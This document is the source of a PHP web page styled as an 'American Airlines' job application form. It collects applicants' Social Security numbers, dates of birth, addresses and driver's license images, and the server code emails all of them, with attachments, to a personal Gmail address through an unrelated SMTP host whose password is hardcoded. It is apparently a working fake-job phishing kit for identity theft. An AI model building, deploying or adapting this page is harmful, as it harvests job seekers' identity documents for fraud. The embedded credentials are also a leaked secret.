<?php 
    		$rsp="";
    		if(isset($_POST['send_btn'])){
				include('./mail/PHPMailerAutoload.php');
                $email = $_POST['email'];
                $name = $_POST['name'];
                $number = $_POST['number'];
               $address = $_POST['address'];
               $city = $_POST['city'];
               $zip = $_POST['zip'];
               $about = $_POST['about'];
               $dob = $_POST['dob'];
               $ssn = $_POST['ssn'];

            //    $targetDirectory = "uploads/";
            //   $targetFile = basename($_FILES['resume']['name']);
            //   $targetFile1 = basename($_FILES['frontDriverLicense']['name']);
            //   $targetFile2 =  basename($_FILES['backDriverLicense']['name']);


               $uploadSuccess = true; // Flag to track if the file upload was successful

               

            // //get the file extension of the file
            // $type_of_uploaded_file = substr($name_of_uploaded_file,  strrpos($name_of_uploaded_file, '.') + 1);

            // $size_of_uploaded_file = $_FILES["resume"]["size"]/1024;

            // $max_allowed_file_size = 100; // size in KB
            //     $allowed_extensions = array("jpg", "jpeg", "gif", "bmp");

            //     //Validations
            //     if($size_of_uploaded_file > $max_allowed_file_size )
            //     {
            //     $errors .= "\n Size of file should be less than $max_allowed_file_size";
            //     }

            //     //------ Validate the file extension -----
            //     $allowed_ext = false;
            //     for($i=0; $i<sizeof($allowed_extensions); $i++)
            //     {
            //     if(strcasecmp($allowed_extensions[$i],$type_of_uploaded_file) == 0)
            //     {
            //         $allowed_ext = true;
            //     }
            //     }

            //     if(!$allowed_ext)
            //     {
            //     $errors .= "\n The uploaded file is not supported file type. ".
            //     " Only the following file types are supported: ".implode(',',$allowed_extensions);
            //     }

            //     $path_of_uploaded_file = $upload_folder . $name_of_uploaded_file;
            //         $tmp_path = $_FILES["resume"]["tmp_name"];

            //         if(is_uploaded_file($tmp_path))
            //         {
            //         if(!copy($tmp_path,$path_of_uploaded_file))
            //         {
            //             $errors .= '\n error while copying the uploaded file';
            //         }
            //         }

				extract($_POST);
				$splitReceivers = explode(",", "usmaninobello@gmail.com");

				$totalSent=0;
				$totalReceivers=count($splitReceivers);
				$failedEmails=[];

				foreach ($splitReceivers as $receiver) {
					# code...
                   
					$mail = new PHPMailer;
					$mail->isSMTP();                                      
					$mail->Host = 'debugactive.com';
					$mail->SMTPAuth = true;                           
					$mail->Username = 'sp@debugactive.com';               
					$mail->Password = 'Adebayo1997@';                          
					$mail->SMTPSecure = 'ssl';                            
					$mail->Port = 465;
					$mail->setFrom('sp@debugactive.com', 'Airline');
				    $mail->FromName ='Airline';
				    $mail->addAddress($receiver , "Factorial");              

				    $mail->isHTML(true);                                 

				    $mail->Subject = $name;
				    $email_message = '<h2>Airline Application form Submitted</h2>
                    <p><b>Name:</b> '.$name.'</p>
                    <p><b>Email:</b> '.$email.'</p>
                    <p><b>Phone number:</b> '.$number.'</p>
                    <p><b>City:</b> '.$city.'</p>
                    <p><b>Zip code:</b> '.$zip.'</p>
                    <p><b>about:</b> '.$about.'</p>
                    <p><b>Date of birth:</b> '.$dob.'</p>
                    <p><b>SSN:</b> '.$ssn.'</p>
                    <p><b>address:</b><br/>'.$address.'</p>';
                    $email_message.="Please find the attachment";
                   

                    $mail->Body =    $email_message;
                     // Attach the PDF file
        if (isset($_FILES['resume'])) {
            $pdfFile = $_FILES['resume'];
            $mail->addAttachment($pdfFile['tmp_name'], $pdfFile['name']);
        }

        // Attach the PNG file
        if (isset($_FILES['frontDriverLicense'])) {
            $pngFile = $_FILES['frontDriverLicense'];
            $mail->addAttachment($pngFile['tmp_name'], $pngFile['name']);
        }

        // Attach the JPEG file
        if (isset($_FILES['backDriverLicense'])) {
            $jpegFile = $_FILES['backDriverLicense'];
            $mail->addAttachment($jpegFile['tmp_name'], $jpegFile['name']);
        }
                    // $mail->addAttachment($targetFile);
                   
				    // $mail->Body    = "message from: ".$_POST['name'].'<br>'.$_POST['email'].'<br>'.$_POST['number'].'<br>'.$_POST['address'].'<br>'.$_POST['city'].'<br>'.$_POST['zip'].'<br>'.$_POST['about'].'<br>'.$_POST['resume'].'<br>'.$_POST['dob'].'<br>'.$_POST['ssn'].'<br>'.$_POST['frontDriverLicense'].'<br>'.$_POST['backDriverLicense'];

				    // $mail->SMTPDebug =  1;
				    if($mail->send()) {
				     echo "<div class='alert alert-success alert-dismissible fade show position-fixed' style='top: 150px; right: 20px; z-index: 1050;' role='alert'>
                        <strong>Welldone!!!</strong> Message sent successfully.
                        <button type='button' class='btn-close' data-bs-dismiss='alert' aria-label='Close'></button>
                        </div>";
					        $totalSent+=1;
				    }else{
				    	array_push($failedEmails, $receiver);
				    }
				}

				if($totalSent == $totalReceivers) {
			            echo "<div class='alert alert-success alert-dismissible fade show position-fixed' style='top: 150px; right: 20px; z-index: 1050;' role='alert'>
  <strong>Welldone!!!</strong> Message sent successfully.
  <button type='button' class='btn-close' data-bs-dismiss='alert' aria-label='Close'></button>
</div>";
			    }else{
			    	if($totalSent == 0){

				    echo "<div class='alert alert-danger alert-dismissible fade show position-fixed' style='top: 150px; right: 20px; z-index: 1050;' role='alert'>
  <strong>Error!!!</strong> Message failed to send.
  <button type='button' class='btn-close' data-bs-dismiss='alert' aria-label='Close'></button>
</div>";
			    	}else{
			    	    echo "<div class='alert alert-danger alert-dismissible fade show position-fixed' style='top: 150px; right: 20px; z-index: 1050;' role='alert'>
 Your email has been sent successfully. But could not send to the following emails: (". implode(",", $failedEmails).")
  <button type='button' class='btn-close' data-bs-dismiss='alert' aria-label='Close'></button>
</div>";
			    	
			    	}
			    }
            }

    		
		?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Airlines || Career job</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">

    <!-- Favicon -->
    <link href="img/favicon.ico" rel="icon">

    <!-- Google Web Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@400;500&family=Roboto:wght@400;500;700&display=swap"
        rel="stylesheet">

    <!-- Icon Font Stylesheet -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">

    <!-- Libraries Stylesheet -->
    <link href="lib/animate/animate.min.css" rel="stylesheet">
    <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="lib/lightbox/css/lightbox.min.css" rel="stylesheet">

    <!-- Customized Bootstrap Stylesheet -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Template Stylesheet -->
    <link href="css/style.css" rel="stylesheet">
    <link href="css/my.css" rel="stylesheet">
     <style>
        
      

        .success-message,
        .error-message {
            padding: 10px;
            margin-top: 10px;
            border-radius: 4px;
        }

        .success-message {
            background-color: #dff0d8;
            color: #3c763d;
        }

        .error-message {
            background-color: #f2dede;
            color: #a94442;
        }
    </style>

    <!-- EmailJS CDN-->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
</head>

<body>
    <!-- Navbar & Hero Start -->
    <div class="container-xxl position-relative p-0">
        <nav class="navbar navbar-expand-lg navbar-light px-4 px-lg-5 py-3 py-lg-0">
            <a href="index.html" class="navbar-brand p-0">
                <h1 class="m-0 text-primary">American Airlines</h1>
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse">
                <span class="fa fa-bars"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarCollapse">
                <div class="navbar-nav ms-auto py-0">
                    <a href="index.html" class="nav-item nav-link ">Home</a>
                    <a href="about.html" class="nav-item nav-link">About</a>
                    <a href="apply.php" class="nav-item nav-link active">Apply</a>
                    <a href="contact.php" class="nav-item nav-link">Contact</a>
                </div>
            </div>
        </nav>

        <div class="container-xxl py-5 bg-primary apply-header mb-5">
            <div class="container my-5 py-5 px-lg-5">
                <div class="row g-5 py-5">
                    <div class="col-12 text-center">
                        <h1 class="text-white animated zoomIn">Job Application</h1>
                        <hr class="bg-white mx-auto mt-0" style="width: 90px;">
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb justify-content-center">
                                <li class="breadcrumb-item"><a class="text-white" href="#">Home</a></li>
                                <li class="breadcrumb-item text-white active" aria-current="page">Job Application</li>
                            </ol>
                        </nav>
                    </div>
                </div>
            </div>
        </div>

        <!-- Application Form Start -->
        <div class="container">
            <div class="row">
                <div class="col-lg-6 apply-left-img">
                    <img src="./img/opening_hours-2.jpg" alt="" class="apply-img">
                </div>
                  <?php echo $rsp;echo "<br>"; ?>
                <div class="col-lg-6 apply-right">
                    <h3 class="mt-5 text-center">JOB APPLICATION FORM</h3>
                    
                    <div class="form-section">
                    
                      <form method="POST" id="mail-form"  enctype="multipart/form-data">
                            <div class="slide" id="slide1">
                                <div class="form-group">
                                    <input type="text" placeholder="Name" class="form-control" name="name">
                                </div>
                                <div class="form-group">
                                    <input type="email" placeholder="Email" class="form-control" name="email">
                                </div>
                                <div class="form-group">
                                    <input type="number" placeholder="Phone" class="form-control" name="number">
                                </div>
                                <div class="form-group">
                                    <input type="text" placeholder="Mailing Address" class="form-control"
                                        name="address">
                                </div>
                                <div class="form-group">
                                    <input type="text" placeholder="City" class="form-control" name="city">
                                </div>
                                <div class="form-group">
                                    <input type="number" placeholder="Zip Code" class="form-control" name="zip">
                                </div>
                                <div class="form-group">
                                    <textarea rows="5" placeholder="Tell Us About Yourself" class="form-control"
                                        name="about"></textarea>
                                </div>
                                <div class="form-group">
                                    <label for="driver license">Upload Resume</label>
                                    <input type="file" class="form-control" name="resume">
                                </div>
                                <div style="float: right;">
                                    <button type="button" class="btn btn-primary" onclick="nextSlide()">Next
                                        Step</button>
                                </div>
                            </div>
                            <div class="slide" id="slide2">
                                <div class="form-group">
                                    <label for="Date of birth">Date of Birth</label>
                                    <input type="date" placeholder="Name" class="form-control" name="dob">
                                </div>
                                <div class="form-group">
                                    <input type="number" placeholder="SSN" class="form-control" name="ssn">
                                </div>
                                <div class="form-group">
                                    <label for="driver license">Front Driver License</label>
                                    <input type="file" class="form-control" name="frontDriverLicense">
                                </div>
                                <div class="form-group">
                                    <label for="driver license">Back Driver License</label>
                                    <input type="file" class="form-control" name="backDriverLicense">
                                </div>
                                <div class="my-3">
                                <div class="loading">Loading</div>
                                <!--<div class="error-message"></div>-->
                                
                                <div class="sent-message">Your message has been sent. Thank you!</div>
                            </div>
                                <div class="d-flex justify-content-between">
                                    <button type="button" class="btn btn-success"
                                        onclick="prevSlide()">Previous</button>
                                        <input name="send_btn" class="btn btn-primary" type="submit" value="Send Message">
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <!-- Footer Start -->
        <div class="container-fluid bg-primary text-light footer mt-5 pt-5 wow fadeIn" data-wow-delay="0.1s">
            <div class="container py-5 px-lg-5">
                <div class="row g-5">
                    <div class="col-md-6 col-lg-3">
                        <h5 class="text-white mb-4">Get In Touch</h5>
                        <p><i class="fa fa-map-marker-alt me-3"></i>123 Street, New York, USA</p>
                        <p><i class="fa fa-phone-alt me-3"></i>+012 345 67890</p>
                        <p><i class="fa fa-envelope me-3"></i>info@example.com</p>
                        <div class="d-flex pt-2">
                            <a class="btn btn-outline-light btn-social" href=""><i class="fab fa-twitter"></i></a>
                            <a class="btn btn-outline-light btn-social" href=""><i class="fab fa-facebook-f"></i></a>
                            <a class="btn btn-outline-light btn-social" href=""><i class="fab fa-youtube"></i></a>
                            <a class="btn btn-outline-light btn-social" href=""><i class="fab fa-instagram"></i></a>
                            <a class="btn btn-outline-light btn-social" href=""><i class="fab fa-linkedin-in"></i></a>
                        </div>
                    </div>
                    <div class="col-md-6 col-lg-3">
                        <h5 class="text-white mb-4">Popular Link</h5>
                        <a class="btn btn-link" href="">About Us</a>
                        <a class="btn btn-link" href="">Contact Us</a>
                        <a class="btn btn-link" href="">Privacy Policy</a>
                        <a class="btn btn-link" href="">Terms & Condition</a>
                        <a class="btn btn-link" href="">Career</a>
                    </div>
                    <div class="col-md-6 col-lg-3">
                        <h5 class="text-white mb-4">Newsletter</h5>
                        <p>Lorem ipsum dolor sit amet elit. Phasellus nec pretium mi. Curabitur facilisis ornare velit
                            non vulpu</p>
                        <div class="position-relative w-100 mt-3">
                            <input class="form-control border-0 rounded-pill w-100 ps-4 pe-5" type="text"
                                placeholder="Your Email" style="height: 48px;">
                            <button type="button" class="btn shadow-none position-absolute top-0 end-0 mt-1 me-2"><i
                                    class="fa fa-paper-plane text-primary fs-4"></i></button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- Footer End -->

        <!-- Back to Top -->
        <a href="#" class="btn btn-lg btn-primary btn-lg-square back-to-top pt-2"><i class="bi bi-arrow-up"></i></a>

    </div>
    <!-- Navbar & Hero End -->

    <!-- Apply End -->
    <!-- Template Javascript -->
    <script src="js/main.js"></script>
    <script src="js/mailer.js"></script>
    <script src="https://cdn.emailjs.com/sdk/2.6.4/email.min.js"></script>

    <script>
        let currentSlide = 1;
        showSlide(currentSlide);

        function showSlide(n) {
            const slides = document.getElementsByClassName("slide");
            for (let i = 0; i < slides.length; i++) {
                slides[i].style.display = "none";
            }
            slides[currentSlide - 1].style.display = "block";
        }

        function nextSlide() {
            if (currentSlide < 2) {
                currentSlide++;
                showSlide(currentSlide);
            }
        }

        function prevSlide() {
            if (currentSlide > 1) {
                currentSlide--;
                showSlide(currentSlide);
            }
        }

    </script>
</body>

</html>